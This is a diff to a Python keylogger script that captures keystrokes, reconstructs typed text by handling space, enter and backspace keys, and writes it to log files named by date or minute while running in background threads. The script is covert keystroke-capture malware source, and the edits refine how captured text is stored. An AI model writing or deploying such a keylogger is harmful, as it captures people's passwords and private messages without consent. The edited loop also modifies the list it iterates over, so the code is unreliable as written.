@@ -24,10 +24,17 @@ def writeloop():
     global days_run
     global previous_date
     def write_keys(list):
-        with open('log{}.txt'.format(previous_date.date()), 'w') as logfile:
-            for key in keys_previous_day:
-                key = str(key).replace("'", "").replace("Key.space", " ").replace("Key.enter", "\n").replace("Key.backspace","\b")
+        global keys_previous_day
+        with open('log{}.txt'.format(previous_date.minute), 'w') as logfile:
+            for previouskey, key in zip(keys_previous_day, keys_previous_day[1:]):
+                key = str(key).replace("'", "").replace("Key.space", " ").replace("Key.enter", "\n")
+                if keys_previous_day[0] == "Key.backspace":
+                    keys_previous_day = keys_previous_day[1:]
+                if key == "Key.backspace":
+                    keys_previous_day.remove(key)
+                    keys_previous_day.remove(previouskey)
                 logfile.write(str(key))
+                
     while True:
         if current_date.date() == previous_date.date() + timedelta(days=1):
             days_run +=1
@@ -51,3 +58,4 @@ thread1.isDaemon()
 thread1.start()
 thread2.start()
 X.start()
+
